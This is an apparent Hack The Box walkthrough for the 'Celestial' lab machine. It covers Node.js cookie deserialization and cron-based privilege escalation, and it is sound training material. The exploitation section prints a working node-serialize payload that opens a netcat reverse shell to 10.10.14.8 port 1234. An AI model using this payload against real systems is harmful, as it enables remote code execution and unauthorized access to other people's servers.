# Celestial

*Converted from: Celestial.pdf*

---

# Celestial
## **25 [th] August 2018 / Document No D18.100.15**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Author: 3ndG4me**

**Difficulty: Medium**

**Classification: Official**


Page 1 / 5


## **SYNOPSIS**

Celestial is a medium difficulty machine which focuses on deserialization exploits. It is not the

most realistic, however it provides a practical example of abusing client-size serialized objects in

NodeJS framework.


## **Skills Required**


  - Basic/intermediate knowledge of Linux

  - Basic/intermediate knowledge of

Javascript

  - Understanding of object serialization


## **Skills Learned**


  - Exploiting object deserialization in

NodeJS

  - Enumerating system log files


Page 2 / 5


## **Enumeration** **Nmap**

Nmap finds on Node.js running on port 3000.



Page 3 / 5


​

​


​


## **Exploitation** **NodeJS Deserialization**

Viewing the NodeJS server in a browser presents a 404, however after refreshing the page,

​

​


​



some text is displayed. Looking at cookies reveals a **profile** ​ entry, which is a base64-encoded

​


​



​

JSON string. Attempting to change the **num** ​ value to an unquoted string will cause an error which


​



​

​

reveals some key information.


​



​

​


​



​

​


The username is **sun** ​ and the data appears to be unserialized. A quick search finds several

guides on building a serialized payload for code execution through NodeJS. In this case, an exec

function can be passed as the username and it will be executed.


**{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat**

**/tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f', function(error, stdout, stderr) {**

**console.log(stdout) })","country":"Lameville","city":"Lametown","num":"2"}**


Page 4 / 5



​

​


​


​

​


## **Privilege Escalation** **Root**

​

​



As the **sun** ​ user is part of the admin group, it has access to read most log files. Looking at

​



​

**/var/www/syslog** reveals a root cronjob which executes **/home/sun/Documents/script.py** ​ every



​

​

5 minutes.



​

​



​

​


As the script is owned by the current user, modifying the script to create a reverse shell is all that

is needed for escalation.


Page 5 / 5



​

​



​

​


